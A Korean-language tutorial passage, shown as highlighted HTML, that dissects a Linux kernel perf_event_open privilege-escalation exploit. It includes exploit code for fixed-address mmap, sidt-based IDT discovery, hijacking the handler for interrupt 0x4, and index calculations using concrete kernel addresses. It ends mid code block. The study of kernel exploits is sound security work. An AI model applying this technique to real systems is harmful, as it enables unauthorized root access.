-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="mi">5112</span> <span class="k">static</span> <span class="kt">void</span> <span class="n">sw_perf_event_destroy</span><span class="p">(</span><span class="k">struct</span> <span class="n">perf_event</span> <span class="o">*</span><span class="n">event</span><span class="p">)</span>
-</span><span class='line'><span class="mi">5113</span> <span class="p">{</span>
-</span><span class='line'><span class="mi">5114</span>         <span class="n">u64</span> <span class="n">event_id</span> <span class="o">=</span> <span class="n">event</span><span class="o">-&gt;</span><span class="n">attr</span><span class="p">.</span><span class="n">config</span><span class="p">;</span>
-</span><span class='line'><span class="mi">5115</span>
-</span><span class='line'><span class="mi">5116</span>         <span class="nf">WARN_ON</span><span class="p">(</span><span class="n">event</span><span class="o">-&gt;</span><span class="n">parent</span><span class="p">);</span>
-</span><span class='line'><span class="mi">5117</span>
-</span><span class='line'><span class="mi">5118</span>         <span class="nf">static_key_slow_dec</span><span class="p">(</span><span class="o">&amp;</span><span class="n">perf_swevent_enabled</span><span class="p">[</span><span class="n">event_id</span><span class="p">]);</span>
-</span><span class='line'><span class="mi">5119</span>         <span class="nf">swevent_hlist_put</span><span class="p">(</span><span class="n">event</span><span class="p">);</span>
-</span><span class='line'><span class="mi">5120</span> <span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>이 경우, <code>event-&gt;attr.config == 0xffFFffFF</code> 라고 하면,</p>
-
-<p><code>(u64)0xffFFffFF * 4 + 0xffFFffFF81f360C0 == 0x0000000381F360bc</code></p>
-
-<p>이번에는 user space 를 inc() 들어간다.</p>
-
-<p>이제 exploit code 로 가보자.</p>
-
-<h4>mmap &amp; MAP_FIXED</h4>
-
-<p>MAP_FIXED 로 하면, a specified address 에 메모리를 alloc 해달라고 요청할 수 있다.</p>
-
-<h4>syscall wrapper</h4>
-
-<p><code>/usr/include/asm/unistd_64.h</code> 에서 symbolic constant 를 얻을 수 있다.</p>
-
-<p><code>#define __NR_getpid    39</code> 같은.</p>
-
-<h4>Interrupt Descriptor table and sidt</h4>
-
-<p>register <code>IDTR</code> 은 다음과 같은 structure 를 track 하고 있는데.</p>
-
-<figure class='code'><figcaption><span>static_key_slow_inc()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="c1">// 64bit IDTR structure</span>
-</span><span class='line'><span class="k">struct</span> <span class="p">{</span>
-</span><span class='line'>    <span class="kt">uint16_t</span> <span class="n">limit</span><span class="p">;</span>
-</span><span class='line'>    <span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">;</span>
-</span><span class='line'><span class="p">}</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">packed</span><span class="p">))</span> <span class="n">idtr</span><span class="p">;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>reg <code>IDTR</code> 을 조작할때는 <code>sidt</code> &amp; <code>lidt</code> instruction 을 사용. <code>lidt</code> 는 kernel 에서 호출. <code>sidt</code> 는 user-land 에서도 가능.</p>
-
-<h4>Linux kernel performance monitoring interface</h4>
-
-<p><code>perf_event_open</code> -> fd 를 얻을 수 있다. <code>perf_event_open</code> 은 결국 <code>perf_swevent_init</code> 를 호출.</p>
-
-<h4>Buggy increment in the kernel</h4>
-
-<figure class='code'><figcaption><span>static_key_slow_inc()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="c1">// first arg to perf_event_open</span>
-</span><span class='line'><span class="k">struct</span> <span class="n">perf_event_attr</span> <span class="p">{</span>
-</span><span class='line'>    <span class="n">__u32</span>       <span class="n">type</span><span class="p">;</span>
-</span><span class='line'>    <span class="n">__u32</span>       <span class="n">size</span><span class="p">;</span>
-</span><span class='line'>    <span class="n">__u32</span>       <span class="n">config</span>
-</span><span class='line'>    <span class="p">...</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>Buggy decrement in the kernel</h4>
-
-<figure class='code'><figcaption><span>static_key_slow_inc()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">static</span> <span class="kt">void</span> <span class="nf">sw_perf_event_destroy</span><span class="p">(</span><span class="k">struct</span> <span class="n">perf_event</span> <span class="o">*</span><span class="n">event</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>    <span class="n">u64</span> <span class="n">event_id</span> <span class="o">=</span> <span class="n">event</span><span class="o">-&gt;</span><span class="n">attr</span><span class="p">.</span><span class="n">config</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="p">...</span>
-</span><span class='line'>    <span class="n">atomic_dec</span><span class="p">(</span><span class="o">&amp;</span><span class="n">perf_swevent_enabled</span><span class="p">[</span><span class="n">event_id</span><span class="p">]);</span>
-</span><span class='line'>    <span class="p">...</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>event_id 는 64 bit 가 되니까 엄청나게 큰 레인지를 addressing 할 수 있다. perf_swevent_enabled 가 integer array 라면 multiplied by 4 가 되어서.</p>
-
-<h4>mmap()</h4>
-
-<ul>
-<li>mmap() / MAP_FIXED 로 초기 메모리를 alloc 한다.</li>
-</ul>
-
-
-<figure class='code'><figcaption><span>static_key_slow_inc()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define BASE        0x380000000</span>
-</span><span class='line'><span class="cp">#define SIZE        0x010000000 </span><span class="c1">// 256 megabytes</span>
-</span><span class='line'><span class="cp">#define KSIZE       0x002000000 </span><span class="c1">// 32 megabytes</span>
-</span><span class='line'><span class="n">map</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">BASE</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span>
-</span><span class='line'>                <span class="n">MAP_FIXED</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span>
-</span><span class='line'>                <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
-</span><span class='line'>                <span class="mi">0</span><span class="p">);</span>
-</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">map</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">BASE</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;mmap was unable to get fixed address: %lx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">BASE</span><span class="p">);</span>
-</span><span class='line'>    <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'><span class="n">memset</span><span class="p">(</span><span class="n">map</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">);</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>BASE 가 <code>0x380000000</code> 로 잡힌 이유는</p>
-
-<figure class='code'><figcaption><span>static_key_slow_inc()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">boot</span><span class="o">/</span><span class="n">System</span><span class="p">.</span><span class="n">map</span><span class="o">-</span><span class="mf">2.6.32</span><span class="o">-</span><span class="mf">358.</span><span class="n">el6</span><span class="p">.</span><span class="n">x86_64</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">perf_swevent_enabled</span>
-</span><span class='line'><span class="n">ffffffff81f360c0</span> <span class="n">B</span> <span class="n">perf_swevent_enabled</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li><p>perf_swevent_enabled array 가 0xffffffff81f360c0 이고.</p></li>
-<li><p>config 로 -1 을 던지면, dec 는 0x0000000381F360bc 에 동작하게되고.</p></li>
-</ul>
-
-
-<p><code>0xffFFffFF * 4 + 0xffFFffFF81f360C0 == 0x0000000381F360bc</code></p>
-
-<ul>
-<li>config 를 -2 로 던지면, dec 는 0x0000000381F360b8 에 가게된다.</li>
-</ul>
-
-
-<p>그러니까 memory region 0x380000000 ~ 0x390000000 로 가면, config 를 -1,-2 로 던질때 dec 되는 address 를 커버한다.</p>
-
-<h4>break_perf_event_open(-1)</h4>
-
-<figure class='code'><figcaption><span>static_key_slow_inc()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">static</span> <span class="kt">void</span> <span class="nf">break_perf_event_open</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">off</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>    <span class="k">struct</span> <span class="n">perf_event_attr</span> <span class="n">pea</span> <span class="o">=</span> <span class="p">{</span>
-</span><span class='line'>        <span class="p">.</span><span class="n">type</span> <span class="o">=</span> <span class="n">PERF_TYPE_SOFTWARE</span><span class="p">;</span>
-</span><span class='line'>        <span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">perf_event_attr</span><span class="p">),</span>
-</span><span class='line'>        <span class="p">.</span><span class="n">config</span> <span class="o">=</span> <span class="n">off</span><span class="p">,</span>
-</span><span class='line'>        <span class="p">.</span><span class="n">mmap</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
-</span><span class='line'>        <span class="p">.</span><span class="n">freq</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
-</span><span class='line'>    <span class="p">};</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_perf_event_open</span><span class="p">,</span>
-</span><span class='line'>                        <span class="o">&amp;</span><span class="n">pea</span><span class="p">,</span> <span class="c1">// struct perf_event_attr __user *attr_uptr</span>
-</span><span class='line'>                        <span class="mi">0</span><span class="p">,</span> <span class="c1">// pid_t pid (target pid)</span>
-</span><span class='line'>                        <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="c1">// int cpu (target cpu)</span>
-</span><span class='line'>                        <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="c1">// int groud_fd (group leader fd)</span>
-</span><span class='line'>                        <span class="mi">0</span><span class="p">);</span> <span class="c1">// unsigned long flags</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>        <span class="n">perror</span><span class="p">(</span><span class="s">&quot;perf_event_open&quot;</span><span class="p">);</span>
-</span><span class='line'>        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
-</span><span class='line'>    <span class="p">}</span>
-</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>        <span class="n">perror</span><span class="p">(</span><span class="s">&quot;close&quot;</span><span class="p">);</span>
-</span><span class='line'>        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
-</span><span class='line'>    <span class="p">}</span>
-</span><span class='line'>    <span class="k">return</span><span class="p">;</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>Find the offset into the memory region where the write occurred</h4>
-
-<p>이제 config -1 &amp; -2 로 dec 된 메모리를 찾는다.</p>
-
-<p>i.e. <code>0x381f360b8</code>, <code>0x381f360bc</code> 가 dec 되야한다.</p>
-
-<figure class='code'><figcaption><span>static_key_slow_inc()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span> <span class="n">SIZE</span><span class="o">/</span><span class="mi">4</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>    <span class="kt">uint32_t</span> <span class="o">*</span><span class="n">tmp</span> <span class="o">=</span> <span class="n">map</span><span class="o">+</span><span class="n">i</span><span class="p">;</span>
-</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">tmp</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">(</span><span class="n">tmp</span> <span class="o">+</span><span class="mi">1</span><span class="p">))</span>
-</span><span class='line'>        <span class="k">break</span><span class="p">;</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>The Interrupt Descriptor Table (IDT)</h4>
-
-<p>x86 아키텍쳐에서 인터럽트 벡터 테이블을 구현하기위한 데이터 구조. CPU 가 인터럽트나 익셉션에 대응하기 위해 필요하다. IDT 는 256 개의 벡터로 구성되어있다. IDT 는 물리 메모리 어디든 존재할 수 있는데, IDTR 이란는 특수 레지스터에 the physical base address / the length in bytes of the IDT 가 저장된다.</p>
-
-<p>x86_64 에서는, 다음과 같이 나타낼 수 있다.</p>
-
-<figure class='code'><figcaption><span>static_key_slow_inc()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">struct</span> <span class="p">{</span>
-</span><span class='line'>    <span class="kt">uint16_t</span> <span class="n">limit</span><span class="p">;</span>
-</span><span class='line'>    <span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">;</span>
-</span><span class='line'><span class="p">}</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">packed</span><span class="p">))</span> <span class="n">idt</span><span class="p">;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>IDTR</h4>
-
-<p>64-bit IDT entry&rsquo;s handler offset 을 변경하는 것이 핵심이다.</p>
-
-<p>일단 IDTR 을 찍어보면</p>
-
-<figure class='code'><figcaption><span>static_key_slow_inc()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="err">$</span> <span class="n">cat</span> <span class="n">idtr</span><span class="p">.</span><span class="n">c</span>
-</span><span class='line'><span class="p">...</span>
-</span><span class='line'><span class="n">main</span><span class="p">()</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>    <span class="k">struct</span> <span class="p">{</span>
-</span><span class='line'>        <span class="kt">uint16_t</span> <span class="n">limit</span><span class="p">;</span>
-</span><span class='line'>        <span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">;</span>
-</span><span class='line'>    <span class="p">}</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">packed</span><span class="p">))</span> <span class="n">idt</span><span class="p">;</span>
-</span><span class='line'>    <span class="kt">uint64_t</span> <span class="n">kbase</span><span class="p">;</span>
-</span><span class='line'>    <span class="n">asm</span> <span class="nf">volatile</span> <span class="p">(</span><span class="s">&quot;sidt %0&quot;</span> <span class="o">:</span> <span class="s">&quot;=m&quot;</span> <span class="p">(</span><span class="n">idt</span><span class="p">));</span>
-</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%016lx:%04x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">idt</span><span class="p">.</span><span class="n">addr</span><span class="p">,</span> <span class="n">idt</span><span class="p">.</span><span class="n">limit</span><span class="p">);</span>
-</span><span class='line'>    <span class="n">kbase</span> <span class="o">=</span> <span class="n">idt</span><span class="p">.</span><span class="n">addr</span> <span class="o">&amp;</span> <span class="mh">0xff000000</span><span class="p">;</span>
-</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%016lx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">kbase</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">idtr</span>
-</span><span class='line'><span class="nl">ffffffff81df8000</span><span class="p">:</span><span class="mf">0ff</span><span class="n">f</span>
-</span><span class='line'><span class="mo">00000000</span><span class="mi">81000000</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>앞의 <code>0xffffffff</code> 에 increment 가 들어가서 <code>0x00000000</code> 으로 바뀌는게 exploit 의 핵심이다.</p>
-
-<h4>Incrementing the address of an IDT handler</h4>
-
-<p>공개된 exploit 에서는 interrupt 0x4 를 hijack 했다.</p>
-
-<p><img src="/images/interrupts.png"></p>
-
-<p>16-byte descriptor 구조를 보면,</p>
-
-<p><img src="/images/id.png"></p>
-
-<figure class='code'><figcaption><span>static_key_slow_inc()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">Offset</span>  <span class="n">Size</span>    <span class="n">Description</span>
-</span><span class='line'><span class="mi">0</span>       <span class="mi">2</span>       <span class="n">Offset</span> <span class="n">low</span> <span class="n">bits</span> <span class="p">(</span><span class="mf">0..15</span><span class="p">)</span>
-</span><span class='line'><span class="mi">2</span>       <span class="mi">2</span>       <span class="n">Selector</span> <span class="p">(</span><span class="n">Code</span> <span class="n">segment</span> <span class="n">selector</span><span class="p">)</span>
-</span><span class='line'><span class="mi">4</span>       <span class="mi">1</span>       <span class="n">Zero</span>
-</span><span class='line'><span class="mi">5</span>       <span class="mi">1</span>       <span class="n">Type</span> <span class="n">and</span> <span class="n">Attributes</span> <span class="p">(</span><span class="n">same</span> <span class="n">as</span> <span class="n">before</span><span class="p">)</span>
-</span><span class='line'><span class="mi">6</span>       <span class="mi">2</span>       <span class="n">Offset</span> <span class="n">middle</span> <span class="n">bits</span> <span class="p">(</span><span class="mf">16..31</span><span class="p">)</span>
-</span><span class='line'><span class="mi">8</span>       <span class="mi">4</span>       <span class="n">Offset</span> <span class="n">high</span> <span class="n">bits</span> <span class="p">(</span><span class="mf">32..63</span><span class="p">)</span>
-</span><span class='line'><span class="mi">12</span>      <span class="mi">4</span>       <span class="n">Zero</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>offset 8 의 경우, x86_64 에서 0xffFFffFF 가 될텐데, 이걸 atomic_inc() 시키는게 목표가 된다.</p>
-
-<ol>
-<li>0x4 번 인터럽트에 해당하는 interrupt descriptor 를 corrupt 시켜야하는데.</li>
-<li>0,1,2,3 4*16 = 64. hex(64) = 0x40</li>
-<li>offset 8 에 위치한 4 byte 를 atomic_inc() 시켜야하니까, 0x40 + offset 8 = 0x48</li>
-<li>idt.addr + 0x48 부터 위치한 4 byte 에 atomic_inc() 가 들어가야한다.</li>
-<li>나중에 <code>uint32_t *fixptr; fixptr = idt.addr + 0x48; *fixptr = -1</code> 로 원복이 들어가야한다.</li>
-</ol>
-
-
-<p>Ubuntu 12.04 에서</p>
-
-<ol>
-<li>idt.addr == 0xffffffff81df8000</li>
-<li>perf_swevent_enabled == 0xffffffff81ef7160</li>
-</ol>
-
-
-<p>즉 idt.addr + 0x48 은 perf_swevent_enabled 앞에 위치함.</p>
-
-<ol>
-<li>target address 는 idt.addr + 0x48 (kernel 에 있음)</li>
-<li>(perf_swevent_enabled - idt.addr - 0x48) / 4 하면 minus 로 얼마나 index 를 땡겨야하는지 나옴. perf_swevent_enabled(-index)</li>
-<li>perf_swevent_enabled + (int64_t)0xffffffff * 4 == 0x380000000 + i*4 (overflow 나서)</li>
-</ol>
-
-
-<p>1+2+3 을 조합하면 break_perf_event_open() 에 negative 로 얼마를 줘야하는지 나옴.</p>
-
-<figure class='code'><figcaption><span>calc2.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdint.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;sys/mman.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;linux/perf_event.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;syscall.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;stdint.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;assert.h&gt;</span>
-</span><span class='line'><span class="n">main</span><span class="p">()</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span><span class="n">idt_addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span><span class="mh">0xffffffff81df8000</span><span class="p">;</span>
-</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span><span class="n">target_addr</span> <span class="o">=</span> <span class="n">idt_addr</span> <span class="o">+</span> <span class="mh">0x48</span><span class="p">;</span>
-</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span><span class="n">perf_swevent_enabled</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span><span class="mh">0xffffffff81ef7160</span><span class="p">;</span>
-</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span><span class="n">peek</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">config</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
-</span><span class='line'>    <span class="kt">int32_t</span> <span class="n">idx32</span><span class="p">;</span>
-</span><span class='line'>    <span class="kt">uint64_t</span> <span class="n">uidx64</span><span class="p">;</span>
-</span><span class='line'>    <span class="kt">int64_t</span> <span class="n">idx64</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="n">idx64</span> <span class="o">=</span> <span class="n">config</span><span class="p">;</span>
-</span><span class='line'>    <span class="n">peek</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">perf_swevent_enabled</span><span class="p">[</span><span class="n">idx64</span><span class="p">];</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;atomic_dec(): %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">perf_swevent_enabled</span><span class="p">[</span><span class="n">idx64</span><span class="p">]);</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">calc2</span>
-</span><span class='line'><span class="n">atomic_dec</span><span class="p">()</span><span class="o">:</span> <span class="mh">0x381ef715c</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>그럼 i 가 <code>0x381ef715c - 0x380000000 == 0x1ef715c</code> 에서 <code>0x1ef715c/4 == 0x7bdc57</code>라는 걸 알 수 있다.</p>
-
-<figure class='code'><figcaption><span>calc2.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">break_perf_event_open</span><span class="p">(</span> <span class="o">-</span><span class="n">i</span> <span class="o">+</span> <span class="p">(((</span><span class="n">idt</span><span class="p">.</span><span class="n">addr</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x80000000</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="mi">16</span><span class="p">);</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>break_perf_event_open() 에 들어갈 값을 프로그램으로 검증해본다.</p>
-
-<figure class='code'><figcaption><span>calc2.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
